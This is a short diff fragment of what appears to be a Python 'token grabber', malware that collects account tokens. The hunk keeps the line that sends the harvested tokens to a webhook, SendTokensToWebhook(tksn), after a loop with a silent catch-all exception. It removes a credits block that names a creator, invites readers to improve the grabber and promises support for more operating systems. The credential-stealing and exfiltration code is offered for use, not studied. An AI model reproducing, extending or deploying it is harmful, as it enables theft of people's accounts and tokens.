@@ -87,9 +87,4 @@ for check in tksn:
                 continue
         except:
             pass
-SendTokensToWebhook(tksn)```
-
-Credits: 🧳
-Kumarchino (Creator)
-Feel free to edit and improve this token grabber.
-In the future their will be support for the Windows and the Linux operating system aswell
+SendTokensToWebhook(tksn)
